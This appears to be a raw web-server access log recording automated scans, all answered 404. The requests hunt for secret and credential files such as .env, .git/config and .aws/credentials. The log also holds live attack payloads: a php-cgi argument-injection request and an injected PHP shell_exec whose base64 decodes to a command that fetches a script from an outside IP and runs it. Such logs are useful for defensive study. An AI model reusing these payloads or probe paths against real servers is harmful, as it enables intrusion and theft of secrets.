{"level":"info","message":"GET /config/.env 404 9 - 0.658 ms"}
{"level":"info","message":"GET /config/.env 404 9 - 0.428 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.349 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.833 ms"}
{"level":"info","message":"GET /.git/config 404 9 - 0.247 ms"}
{"level":"info","message":"GET / 404 9 - 0.466 ms"}
{"level":"info","message":"GET /th-th/home 404 9 - 0.247 ms"}
{"level":"info","message":"GET /wordpress/wp-admin/setup-config.php 404 9 - 0.377 ms"}
{"level":"info","message":"GET /wp-admin/setup-config.php 404 9 - 0.259 ms"}
{"level":"info","message":"GET /owa/auth/logon.aspx 404 9 - 0.295 ms"}
{"level":"info","message":"GET / 404 9 - 0.508 ms"}
{"level":"info","message":"GET / 404 9 - 0.889 ms"}
{"level":"info","message":"GET / 404 9 - 0.742 ms"}
{"level":"info","message":"GET / 404 9 - 0.818 ms"}
{"level":"info","message":"POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input 404 9 - 1.750 ms"}
{"level":"info","message":"GET / 404 9 - 0.669 ms"}
{"level":"info","message":"GET / 404 9 - 0.470 ms"}
{"level":"info","message":"GET / 404 9 - 0.516 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.235 ms"}
{"level":"info","message":"GET / 404 9 - 0.551 ms"}
{"level":"info","message":"GET /robots.txt 404 9 - 0.444 ms"}
{"level":"info","message":"GET / 404 9 - 0.247 ms"}
{"level":"info","message":"GET /.git/HEAD 404 9 - 2.766 ms"}
{"level":"info","message":"GET / 404 9 - 0.696 ms"}
{"level":"info","message":"GET /.git/config 404 9 - 0.298 ms"}
{"level":"info","message":"GET /config/.git/config 404 9 - 0.366 ms"}
{"level":"info","message":"GET /config.json 404 9 - 0.250 ms"}
{"level":"info","message":"GET /.env.dev 404 9 - 0.424 ms"}
{"level":"info","message":"GET /.env.testing 404 9 - 0.522 ms"}
{"level":"info","message":"GET /project/.git/config 404 9 - 0.331 ms"}
{"level":"info","message":"GET /.env.bak 404 9 - 0.429 ms"}
{"level":"info","message":"GET /.env.dev.local 404 9 - 0.314 ms"}
{"level":"info","message":"GET /cms/.git/config 404 9 - 0.293 ms"}
{"level":"info","message":"GET /core/.git/config 404 9 - 0.278 ms"}
{"level":"info","message":"GET /files/.git/config 404 9 - 0.260 ms"}
{"level":"info","message":"GET /.env.development.local 404 9 - 0.283 ms"}
{"level":"info","message":"GET /.env.save 404 9 - 0.224 ms"}
{"level":"info","message":"GET /.env.backup 404 9 - 0.247 ms"}
{"level":"info","message":"GET /.env.config 404 9 - 0.315 ms"}
{"level":"info","message":"GET /.env.live 404 9 - 0.225 ms"}
{"level":"info","message":"GET /media/.git/config 404 9 - 0.260 ms"}
{"level":"info","message":"GET /.env.local 404 9 - 0.244 ms"}
{"level":"info","message":"GET /.env.preprod 404 9 - 0.290 ms"}
{"level":"info","message":"GET /.env.production.local 404 9 - 0.273 ms"}
{"level":"info","message":"GET /.env.sandbox 404 9 - 0.235 ms"}
{"level":"info","message":"GET /server/.git/config 404 9 - 0.257 ms"}
{"level":"info","message":"GET /public/.git/config 404 9 - 0.291 ms"}
{"level":"info","message":"GET /.env.ci 404 9 - 0.237 ms"}
{"level":"info","message":"GET /.env.secret 404 9 - 0.228 ms"}
{"level":"info","message":"GET / 404 9 - 0.239 ms"}
{"level":"info","message":"GET /settings/.env 404 9 - 0.248 ms"}
{"level":"info","message":"GET /.env.test 404 9 - 0.251 ms"}
{"level":"info","message":"GET /app/.git/config 404 9 - 0.234 ms"}
{"level":"info","message":"GET /media../.git/config 404 9 - 0.228 ms"}
{"level":"info","message":"GET /.env.template 404 9 - 0.308 ms"}
{"level":"info","message":"GET /assets../.git/config 404 9 - 0.257 ms"}
{"level":"info","message":"GET /api/.git/config 404 9 - 0.229 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.235 ms"}
{"level":"info","message":"GET /.env.staging.local 404 9 - 0.263 ms"}
{"level":"info","message":"GET /backup/.git/config 404 9 - 0.344 ms"}
{"level":"info","message":"GET /static../.git/config 404 9 - 0.294 ms"}
{"level":"info","message":"GET /admin/.git/config 404 9 - 0.247 ms"}
{"level":"info","message":"GET /api/.env 404 9 - 0.227 ms"}
{"level":"info","message":"GET /.env.stage 404 9 - 0.334 ms"}
{"level":"info","message":"GET /build/.env 404 9 - 0.338 ms"}
{"level":"info","message":"GET /config/.env 404 9 - 0.238 ms"}
{"level":"info","message":"GET /configuration/.env 404 9 - 0.242 ms"}
{"level":"info","message":"GET /.env.default 404 9 - 0.324 ms"}
{"level":"info","message":"GET /.env.production 404 9 - 0.237 ms"}
{"level":"info","message":"GET /src/.git/config 404 9 - 0.267 ms"}
{"level":"info","message":"GET /.aws/credentials 404 9 - 0.233 ms"}
{"level":"info","message":"GET /.env.dist 404 9 - 0.260 ms"}
{"level":"info","message":"GET /.env.prod 404 9 - 0.274 ms"}
{"level":"info","message":"GET /.env.uat 404 9 - 0.291 ms"}
{"level":"info","message":"GET /docker-compose.prod.yml 404 9 - 0.235 ms"}
{"level":"info","message":"GET /.env_sample 404 9 - 0.233 ms"}
{"level":"info","message":"GET /prod/.env 404 9 - 0.289 ms"}
{"level":"info","message":"GET /data/.git/config 404 9 - 0.243 ms"}
{"level":"info","message":"GET / 404 9 - 0.271 ms"}
{"level":"info","message":"GET /.docker/.env 404 9 - 0.843 ms"}
{"level":"info","message":"GET /.git/index 404 9 - 0.746 ms"}
{"level":"info","message":"GET /fapi/v1/ticker/bookTicker?symbol=BTCUSDT 404 9 - 1.140 ms"}
{"level":"info","message":"PUT /testing-put.txt 404 9 - 1.604 ms"}
{"level":"info","message":"GET /testing-put.txt 404 9 - 0.261 ms"}
{"level":"info","message":"POST /api/auth/login 404 9 - 8.696 ms"}
{"level":"info","message":"GET /wp-admin/setup-config.php 404 9 - 0.766 ms"}
{"level":"info","message":"GET /wordpress/wp-admin/setup-config.php 404 9 - 0.233 ms"}
{"level":"info","message":"GET / 404 9 - 0.853 ms"}
{"level":"info","message":"GET / 404 9 - 0.275 ms"}
{"level":"info","message":"GET / 404 9 - 0.921 ms"}
{"level":"info","message":"GET / 404 9 - 1.137 ms"}
{"level":"info","message":"GET / 404 9 - 0.464 ms"}
{"level":"info","message":"GET / 404 9 - 0.728 ms"}
{"level":"info","message":"GET / 404 9 - 0.960 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.249 ms"}
{"level":"info","message":"GET / 404 9 - 0.451 ms"}
{"level":"info","message":"GET / 404 9 - 0.314 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.298 ms"}
{"level":"info","message":"GET /api/v2/static/not.found 404 9 - 0.254 ms"}
{"level":"info","message":"GET /api/v2/static/not.found 404 9 - 0.308 ms"}
{"level":"info","message":"GET /remote/logincheck 404 9 - 0.405 ms"}
{"level":"info","message":"GET /remote/logincheck 404 9 - 0.300 ms"}
{"level":"info","message":"GET /fonts/ftnt-icons.woff 404 9 - 0.287 ms"}
{"level":"info","message":"GET /fonts/ftnt-icons.woff 404 9 - 0.245 ms"}
{"level":"info","message":"GET /login?redir=/ng 404 9 - 0.247 ms"}
{"level":"info","message":"GET /login?redir=/ng 404 9 - 0.252 ms"}
{"level":"info","message":"GET /lang/custom/sbin/init 404 9 - 0.258 ms"}
{"level":"info","message":"GET /lang/custom/sbin/init 404 9 - 0.291 ms"}
{"level":"info","message":"GET /static/lang/custom/sbin/init 404 9 - 0.318 ms"}
{"level":"info","message":"GET /static/lang/custom/sbin/init 404 9 - 0.138 ms"}
{"level":"info","message":"GET /lang/legacy/filechecksum 404 9 - 0.277 ms"}
{"level":"info","message":"GET /lang/legacy/filechecksum 404 9 - 0.255 ms"}
{"level":"info","message":"GET /migadmin/lang/legacy/legacy/filechecksum 404 9 - 0.276 ms"}
{"level":"info","message":"GET /migadmin/lang/legacy/legacy/filechecksum 404 9 - 0.288 ms"}
{"level":"info","message":"GET / 404 9 - 0.269 ms"}
{"level":"info","message":"GET /robots.txt 404 9 - 0.371 ms"}
{"level":"info","message":"GET / 404 9 - 0.241 ms"}
{"level":"info","message":"GET /ab2g 404 9 - 0.697 ms"}
{"level":"info","message":"GET /ab2h 404 9 - 0.286 ms"}
{"level":"info","message":"GET / 404 9 - 0.251 ms"}
{"level":"info","message":"GET /download/powershell/ 404 9 - 0.306 ms"}
{"level":"info","message":"GET / 404 9 - 0.605 ms"}
{"level":"info","message":"GET / 404 9 - 0.527 ms"}
{"level":"info","message":"GET /index.php?p=admin/dashboard&a=<?=shell_exec(base64_decode(\"Y3VybCAxNzYuNjUuMTQ5LjE5MyB8IHNo\"));die()?> 404 9 - 0.881 ms"}
{"level":"info","message":"GET / 404 9 - 0.369 ms"}
{"level":"info","message":"GET / 404 9 - 0.669 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.434 ms"}
{"level":"info","message":"GET /.git/config 404 9 - 0.235 ms"}
{"level":"info","message":"GET / 404 9 - 0.320 ms"}
{"level":"info","message":"GET / 404 9 - 0.919 ms"}
{"level":"info","message":"GET / 404 9 - 0.244 ms"}
{"level":"info","message":"GET / 404 9 - 0.231 ms"}
{"level":"info","message":"GET /.env.secret 404 9 - 0.223 ms"}
{"level":"info","message":"GET /.env.staging.local 404 9 - 0.288 ms"}
{"level":"info","message":"GET /.env.backup 404 9 - 0.245 ms"}
{"level":"info","message":"GET /cms/.git/config 404 9 - 0.235 ms"}
{"level":"info","message":"GET /files/.git/config 404 9 - 0.291 ms"}
{"level":"info","message":"GET /config/.git/config 404 9 - 0.215 ms"}
{"level":"info","message":"GET /.env.config 404 9 - 0.227 ms"}
{"level":"info","message":"GET /.env.development.local 404 9 - 0.273 ms"}
{"level":"info","message":"GET /data/.git/config 404 9 - 0.232 ms"}
{"level":"info","message":"GET /media/.git/config 404 9 - 0.282 ms"}
{"level":"info","message":"GET /.aws/credentials 404 9 - 0.241 ms"}
{"level":"info","message":"GET /configuration/.env 404 9 - 0.279 ms"}
{"level":"info","message":"GET /media../.git/config 404 9 - 0.308 ms"}
{"level":"info","message":"GET /public/.git/config 404 9 - 0.347 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.272 ms"}
{"level":"info","message":"GET /.env.preprod 404 9 - 0.260 ms"}
{"level":"info","message":"GET /app/.git/config 404 9 - 0.222 ms"}
{"level":"info","message":"GET /.env.bak 404 9 - 0.236 ms"}
{"level":"info","message":"GET /assets../.git/config 404 9 - 0.297 ms"}
{"level":"info","message":"GET /core/.git/config 404 9 - 0.282 ms"}
{"level":"info","message":"GET /.env.ci 404 9 - 0.285 ms"}
{"level":"info","message":"GET /.env.test 404 9 - 0.250 ms"}
{"level":"info","message":"GET /www/.git/config 404 9 - 0.263 ms"}
{"level":"info","message":"GET /.env.sandbox 404 9 - 0.407 ms"}
{"level":"info","message":"GET /config/.env 404 9 - 0.438 ms"}
{"level":"info","message":"GET /prod/.env 404 9 - 0.281 ms"}
{"level":"info","message":"GET /backup/.git/config 404 9 - 0.283 ms"}
{"level":"info","message":"GET /.env.dist 404 9 - 0.246 ms"}
{"level":"info","message":"GET /.env.production.local 404 9 - 0.308 ms"}
{"level":"info","message":"GET /settings/.env 404 9 - 0.291 ms"}
{"level":"info","message":"GET /.env.dev.local 404 9 - 0.245 ms"}
{"level":"info","message":"GET /.env.local 404 9 - 0.232 ms"}
{"level":"info","message":"GET /.env.prod 404 9 - 0.226 ms"}
{"level":"info","message":"GET /.env.testing 404 9 - 0.265 ms"}
{"level":"info","message":"GET /src/.git/config 404 9 - 0.291 ms"}
{"level":"info","message":"GET /api/.git/config 404 9 - 0.229 ms"}
{"level":"info","message":"GET /.env_sample 404 9 - 0.241 ms"}
{"level":"info","message":"GET /docker-compose.prod.yml 404 9 - 0.265 ms"}
{"level":"info","message":"GET /.env.live 404 9 - 0.348 ms"}
{"level":"info","message":"GET /.git/config 404 9 - 0.309 ms"}
{"level":"info","message":"GET /static../.git/config 404 9 - 0.305 ms"}
{"level":"info","message":"GET /dev/.git/config 404 9 - 0.318 ms"}
{"level":"info","message":"GET /.env.dev 404 9 - 0.308 ms"}
{"level":"info","message":"GET /build/.env 404 9 - 0.315 ms"}
{"level":"info","message":"GET / 404 9 - 0.247 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.234 ms"}
{"level":"info","message":"GET /security.txt 404 9 - 0.243 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.224 ms"}
{"level":"info","message":"GET / 404 9 - 0.234 ms"}
{"level":"info","message":"GET / 404 9 - 0.981 ms"}
{"level":"info","message":"GET / 404 9 - 0.943 ms"}
{"level":"info","message":"GET /index.php?p=admin/dashboard&a=<?=shell_exec(base64_decode(\"Y3VybCAxNzYuNjUuMTQ5LjE5MyB8IHNo\"));die()?> 404 9 - 0.287 ms"}
{"level":"info","message":"GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application 404 9 - 0.432 ms"}
{"level":"info","message":"GET /?XDEBUG_SESSION_START=phpstorm 404 9 - 0.398 ms"}
{"level":"info","message":"GET / 404 9 - 0.736 ms"}
{"level":"info","message":"GET /.git/HEAD 404 9 - 0.297 ms"}
{"level":"info","message":"GET / 404 9 - 0.324 ms"}
{"level":"info","message":"GET /.env_sample 404 9 - 0.347 ms"}
{"level":"info","message":"GET / 404 9 - 1.170 ms"}
{"level":"info","message":"GET /webui/ 404 9 - 0.387 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.377 ms"}
{"level":"info","message":"GET / 404 9 - 0.489 ms"}
{"level":"info","message":"GET /geoserver/web/ 404 9 - 0.479 ms"}
{"level":"info","message":"GET /.git/config 404 9 - 0.387 ms"}
{"level":"info","message":"GET / 404 9 - 0.915 ms"}
{"level":"info","message":"GET / 404 9 - 0.249 ms"}
{"level":"info","message":"POST /index 404 9 - 3.273 ms"}
{"level":"info","message":"GET /actuator/gateway/routes 404 9 - 0.810 ms"}
{"level":"info","message":"GET / 404 9 - 0.288 ms"}
{"level":"info","message":"GET /_profiler/phpinfo 404 9 - 0.304 ms"}
{"level":"info","message":"GET /wp-admin/setup-config.php 404 9 - 0.461 ms"}
{"level":"info","message":"GET /wordpress/wp-admin/setup-config.php 404 9 - 0.471 ms"}
{"level":"info","message":"GET /fapi/v1/ticker/bookTicker?symbol=BTCUSDT 404 9 - 0.618 ms"}
{"level":"info","message":"GET / 404 9 - 0.260 ms"}
{"level":"info","message":"GET / 404 9 - 0.644 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.254 ms"}
{"level":"info","message":"POST /grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo 404 9 - 0.303 ms"}
{"level":"info","message":"POST /grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo 404 9 - 0.200 ms"}
{"level":"info","message":"GET / 404 9 - 0.892 ms"}
{"level":"info","message":"GET / 404 9 - 0.278 ms"}
{"level":"info","message":"GET /robots.txt 404 9 - 0.244 ms"}
{"level":"info","message":"GET /sitemap.xml 404 9 - 0.309 ms"}
{"level":"info","message":"GET /.well-known/security.txt 404 9 - 0.225 ms"}
{"level":"info","message":"GET /favicon.ico 404 9 - 0.299 ms"}
{"level":"info","message":"GET /.env 404 9 - 0.948 ms"}
{"level":"info","message":"POST / 404 9 - 1.494 ms"}
{"level":"info","message":"GET / 404 9 - 0.219 ms"}
{"level":"info","message":"GET / 404 9 - 0.367 ms"}
{"level":"info","message":"GET /.env.dev 404 9 - 0.292 ms"}
{"level":"info","message":"GET /aaa9 404 9 - 0.402 ms"}
{"level":"info","message":"GET /aab8 404 9 - 0.313 ms"}
{"level":"info","message":"GET / 404 9 - 0.278 ms"}
{"level":"info","message":"GET /pdown 404 9 - 0.822 ms"}
{"level":"info","message":"GET /pdown 404 9 - 0.253 ms"}
{"level":"info","message":"GET / 404 9 - 0.921 ms"}
{"level":"info","message":"GET /owa/auth/x.js 404 9 - 2.601 ms"}
{"level":"info","message":"GET /.git/config 404 9 - 0.438 ms"}
